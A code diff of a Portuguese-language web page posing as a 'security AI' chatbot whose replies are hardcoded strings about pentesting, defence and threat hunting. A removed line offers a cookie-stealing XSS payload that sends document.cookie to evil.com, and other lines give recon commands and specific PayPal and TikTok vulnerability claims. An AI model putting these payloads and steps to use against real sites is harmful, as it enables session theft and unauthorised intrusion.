@@ -3,100 +3,123 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-<title>DNAT SECURITY AI v2.1</title>
+<meta http-equiv="Cache-Control" content="no-cache">
+<title>DNAT SECURITY AI v2.4 - BOA CAMPEÃO</title>
 <style>
-html,body{margin:0;background:#000;color:#0f0;font-family:monospace;min-height:100vh}
-.header{text-align:center;padding:15px 0;position:sticky;top:0;background:#000;z-index:10;border-bottom:1px solid #0f0}
-.header h1{margin:0;color:#0f0;text-shadow:0 0 10px #0f0;font-size:20px}
-.box{width:90%;max-width:550px;margin:20px auto;border:1px solid #0f0;padding:15px;background:#050505;border-radius:6px}
-input{width:95%;background:#000;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px 0;border-radius:4px}
-button{width:100%;background:#0f0;color:#000;padding:12px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;margin-top:10px}
-#chatArea{display:none;margin-top:20px;border-top:1px dashed #0f0;padding-top:15px}
-.msg{margin:8px 0;padding:8px;border-radius:4px;font-size:13px;white-space:pre-wrap}
+html,body{margin:0;background:#000;color:#0f0;font-family:monospace}
+.header{text-align:center;padding:12px 0;background:#000;border-bottom:1px solid #0f0;position:sticky;top:0;z-index:10}
+.box{width:92%;max-width:600px;margin:15px auto;border:1px solid #0f0;padding:12px;background:#050505;border-radius:8px}
+input,button{width:95%;padding:11px;margin:5px 0;border-radius:6px}
+input{background:#000;color:#0f0;border:1px solid #0f0}
+button{background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer}
+.modeBtn{width:30%;margin:3px;padding:12px;font-size:12px;border-radius:20px}
+#chatArea{display:none}
+.msg{margin:8px 0;padding:9px;border-radius:6px;font-size:13px;white-space:pre-wrap}
 .user{background:#0f0;color:#000;text-align:right}
-.ai{background:#111;border:1px solid #0f0;color:#0f0}
-#log{width:90%;max-width:650px;margin:10px auto;color:#0a0;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ai{background:#111;border:1px solid #0f0}
 </style>
 </head>
 <body>
 <div class="header">
-<h1>DNAT SECURITY AI</h1>
-<div style="font-size:11px">Desenvolvida por Thfwck00, Andre unic, Note e Pis3i - THE BEST SQUAD 2026</div>
+<h1 style="margin:0;text-shadow:0 0 10px #0f0">DNAT SECURITY AI</h1>
+<div style="font-size:9px">Thfwck00, Andre unic, Note, Pis3i - THE BEST SQUAD</div>
 </div>
 
 <div class="box" id="loginBox">
-<div>$ init dnat-ai --ethical-mode<br>name is pentester:</div>
-<input id="nameInput" placeholder="Andre unic ou Thfwck00" autocomplete="off">
-<div id="statusBox" style="margin-top:10px;padding:8px;background:#111;border:1px solid #333;font-size:12px;min-height:40px"></div>
+<div>$ init dnat-ai --ethical-mode<br>name is hunter:</div>
+<input id="nameInput" placeholder="Thfwck00 ou Andre unic">
+<div id="statusBox" style="min-height:20px;background:#111;padding:5px;font-size:12px"></div>
 <button id="enterBtn">ENTER SYSTEM</button>
 </div>
 
 <div class="box" id="chatArea">
-<div style="color:#0f0;font-weight:bold">[DNAT AI] Online - Chat Liberado 🔓</div>
-<div id="chatBox" style="max-height:350px;overflow:auto;margin:15px 0;border:1px solid #222;padding:10px;min-height:100px"></div>
-<input id="chatInput" placeholder="Digite: analisa paypal">
-<button id="sendBtn">ENVIAR PARA IA</button>
+<div id="chatBox" style="max-height:450px;overflow:auto;border:1px solid #222;padding:8px;min-height:120px"></div>
+<div id="modeSelect" style="text-align:center;margin:10px 0">
+<button class="modeBtn" onclick="selectMode('Pentest')">Pentest</button>
+<button class="modeBtn" onclick="selectMode('cybersecurity')">cybersecurity</button>
+<button class="modeBtn" onclick="selectMode('CyberHunter')">CyberHunter</button>
+</div>
+<input id="chatInput" placeholder='Digite: Pentest ou cybersecurity ou CyberHunter'>
+<button id="sendBtn">ENVIAR</button>
 </div>
 
-<div id="log"></div>
-
 <script>
-const founders=["Thfwck00","Note","Pis3i","Thfack00","Thck00"];
-const verified={"Andre unic":["4113932","4113594","4113379"],"André unic":["4113932","4113594","4113379"]};
-let current=null;
+const founders=["Thfwck00","Note","Pis3i"]; const verified={"Andre unic":1,"André unic":1};
+let cur=null, mode=null;
 
-function updateStatus(name){
- const box=document.getElementById('statusBox');
- if(founders.includes(name)){
-  box.innerHTML=`<span style="color:#0f0">FOUNDER - THE BEST SQUAD<br>${name} - Acesso total</span><br><br>FOUNDER Verified: ${name}`;
-  return true;
- }else if(verified[name]){
-  let r=verified[name];
-  box.innerHTML=`Report #${r[0]} successfully submitted<br>[paypal] #${r[1]} Subdomain Takeover<br>[tiktok] #${r[2]} Unauthenticated<br><br>Verified Researcher: ${name} - ${r.length} reports<br>FOUNDER Verified: ${name}`;
-  return true;
- }else{
-  box.innerHTML=`Visitante: ${name}<br>Visitante`;
-  return false;
- }
-}
-
-document.getElementById('nameInput').addEventListener('input',e=>{updateStatus(e.target.value.trim())});
-document.getElementById('enterBtn').addEventListener('click',()=>{
- let name=document.getElementById('nameInput').value.trim();
- if(!name) return;
- let ok=founders.includes(name)||verified[name];
- document.getElementById('log').innerText+=`\n[${new Date().toLocaleTimeString()}] [DNAT] ${name} autenticado - Reports 4113932, 4113594, 4113379 TikTok\n[DNAT SECURITY AI] Online - ${name}\n`;
- if(ok){
-  current=name;
-  document.getElementById('chatArea').style.display='block';
-  document.getElementById('chatBox').innerHTML+=`<div class="msg ai">[DNAT AI] Fala ${name}! Sou a DNAT AI. Pergunta sobre paypal, tiktok, ou pede pra gerar payload.</div>`;
-  window.scrollTo(0,document.body.scrollHeight);
-  document.getElementById('chatInput').focus();
- } else {
-  alert('Digite Andre unic ou Thfwck00 pra liberar o chat!');
- }
+document.getElementById('nameInput').addEventListener('input',e=>{
+ let n=e.target.value.trim();
+ let s=document.getElementById('statusBox');
+ if(founders.includes(n)) s.innerHTML=`FOUNDER Verified: ${n}`;
+ else if(verified[n]) s.innerHTML=`Verified: ${n}`;
+ else s.innerText=n?`Visitante: ${n}`:'';
 });
 
+document.getElementById('enterBtn').addEventListener('click',()=>{
+ let n=document.getElementById('nameInput').value.trim(); if(!n) return;
+ if(founders.includes(n)||verified[n]){
+  cur=n;
+  document.getElementById('chatArea').style.display='block';
+  document.getElementById('chatBox').innerHTML=`<div class="msg ai">Boa campeão, vamos fazer o que hoje? 🔥<br><br>Responde com uma palavra:<br><b>Pentest</b> / <b>cybersecurity</b> / <b>CyberHunter</b></div>`;
+  window.scrollTo(0,document.body.scrollHeight);
+  document.getElementById('chatInput').focus();
+ }else alert('Use Thfwck00 ou Andre unic');
+});
+
+function selectMode(m){ document.getElementById('chatInput').value=m; send(); }
+
 function aiReply(q){
- q=q.toLowerCase();
- if(q.includes('paypal')) return `[DNAT AI] Report #4113594 PayPal:\n> Subdomain Takeover em shop.paypal.com\n> CNAME -> bucket S3 não reclamado\n> PoC: dig shop.paypal.com + curl -I\n> Impacto: Alto. Quer template pro HackerOne?`;
- if(q.includes('tiktok')) return `[DNAT AI] Report #4113379 TikTok:\n> /api/user/email sem auth\n> IDOR vaza email de qualquer user\n> Já tá Triaged. Quer que eu escreva o report?`;
- if(q.includes('payload')||q.includes('poc')) return `[DNAT AI] Payload pronto:\nfetch('https://evil.com?c='+document.cookie)\nUse em XSS no subdomain takeover. Ético apenas com autorização!`;
- return `[DNAT AI] Entendi: "${q}"\n> Posso analisar teus reports, gerar PoC, e escrever template HackerOne.\n> Tenta: "analisa paypal"`;
+ let l=q.trim().toLowerCase();
+ // SELEÇÃO DE MODO - UMA PALAVRA
+ if(l==='pentest'){
+  mode='Pentest';
+  return `[DNAT - PENTEST MODE ATIVADO]\nBoa ${cur}! 🔴 Modo Pentest ON.\n\nAgora me fala cru: qual alvo autorizado? Ex:\n- "paypal takeover"\n- "recon tiktok"\n- "metodologia bug bounty"\n- "gerar payload XSS"\n\nO que vamos quebrar hoje (com autorização)?`;
+ }
+ if(l==='cybersecurity'){
+  mode='cybersecurity';
+  return `[DNAT - CYBERSECURITY MODE ATIVADO]\nBoa ${cur}! 🔵 Modo Cybersecurity ON.\n\nVou te ajudar a defender. Ex:\n- "mitigar SSRF"\n- "mitigar IDOR #4113379"\n- "hardening WAF"\n- "template report"\n\nO que vamos proteger hoje?`;
+ }
+ if(l==='cyberhunter'){
+  mode='CyberHunter';
+  return `[DNAT - CYBERHUNTER MODE ATIVADO]\nBoa ${cur}! 🟢 Modo CyberHunter ON.\n\nAgora somos caçadores. Ex:\n- "caçar C2 em logs"\n- "sigma rule takeover"\n- "KQL pra caçar IDOR"\n- "caçar IOC paypal"\n\nO que vamos caçar hoje?`;
+ }
+
+ // RESPOSTAS DENTRO DO MODO
+ if(mode==='Pentest'){
+  if(l.includes('paypal')||l.includes('takeover')) return `[PENTEST] PayPal #4113594: subfinder -> httpx -> subzy run. CNAME dangling pra S3. PoC: dig shop.paypal.com. Só valida, não toma sem permissão escrita.`;
+  if(l.includes('recon')||l.includes('metodologia')) return `[PENTEST] Stack THE BEST SQUAD: subfinder -d alvo.com | httpx -td -sc | nuclei -t cves/. Foca em diff de subdomínios novos.`;
+  if(l.includes('xss')||l.includes('payload')) return `[PENTEST] Payload ético: <svg onload=alert(document.domain)>. Só usa em scope autorizado com impacto HttpOnly check.`;
+  return `[PENTEST] Fala cru, ${cur}: qual alvo? Ex: "tiktok #4113379" ou "como fazer recon?"`;
+ }
+ if(mode==='cybersecurity'){
+  if(l.includes('ssrf')) return `[CYBERSECURITY] Mitiga SSRF: allowlist domínios, bloqueia 169.254.169.254, desativa redirect follow. WAF rule pra metadata.`;
+  if(l.includes('idor')||l.includes('4113379')) return `[CYBERSECURITY] Fix IDOR #4113379: no backend checa if (session.user_id != requested.id) deny. Nunca confia no ID da URL.`;
+  if(l.includes('takeover')) return `[CYBERSECURITY] Fix takeover: limpa DNS dangling, monitora crt.sh, Sigma: query contains s3 + NoSuchBucket.`;
+  return `[CYBERSECURITY] O que vamos hardenar hoje? Manda: "mitigar XSS" ou "WAF bypass defesa"`;
+ }
+ if(mode==='CyberHunter'){
+  if(l.includes('c2')) return `[CYBERHUNTER] Caçar C2: KQL: DeviceNetworkEvents | where RemoteIP in (IOCs) | summarize count() by RemoteIP, bin(Timestamp, 5m) | where count_ > 10 e intervalo fixo = beacon. Procura JA3 suspeito.`;
+  if(l.includes('sigma')) return `[CYBERHUNTER] Sigma Rule: title: DNAT - Takeover Detection - logsource: dns - detection: query|contains: s3.amazonaws.com AND response: NoSuchBucket.`;
+  if(l.includes('tiktok')||l.includes('idor')) return `[CYBERHUNTER] Hunt IDOR: procura em logs WAF: Url contains /api/user/email AND AuthHeader == "" AND response 200 = exploração #4113379.`;
+  return `[CYBERHUNTER] O que vamos caçar? Ex: "caçar C2" ou "KQL pra takeover"`;
+ }
+
+ // SE NÃO ESCOLHEU MODO AINDA
+ return `[DNAT] Tem que escolher uma palavra primeiro, campeão:\n\nDigite exatamente:\nPentest\nou\ncybersecurity\nou\nCyberHunter`;
 }
 
-document.getElementById('sendBtn').addEventListener('click',send);
-document.getElementById('chatInput').addEventListener('keydown',e=>{if(e.key==='Enter') send()});
 function send(){
- let q=document.getElementById('chatInput').value.trim(); if(!q) return;
+ let inp=document.getElementById('chatInput'); let q=inp.value.trim(); if(!q) return;
  let box=document.getElementById('chatBox');
  let u=document.createElement('div'); u.className='msg user'; u.innerText=q; box.appendChild(u);
- let a=document.createElement('div'); a.className='msg ai'; a.innerText='[DNAT AI] digitando...'; box.appendChild(a);
+ let a=document.createElement('div'); a.className='msg ai'; a.innerText='[DNAT] processando...'; box.appendChild(a);
  box.scrollTop=box.scrollHeight;
- setTimeout(()=>{a.innerText=aiReply(q); box.scrollTop=box.scrollHeight;},600);
- document.getElementById('chatInput').value='';
+ setTimeout(()=>{a.innerText=aiReply(q); box.scrollTop=box.scrollHeight; if(mode) document.getElementById('modeSelect').style.display='none';},400);
+ inp.value='';
 }
+document.getElementById('sendBtn').addEventListener('click',send);
+document.getElementById('chatInput').addEventListener('keydown',e=>{if(e.key==='Enter') send()});
+window.selectMode=selectMode;
 </script>
 </body>
 </html>
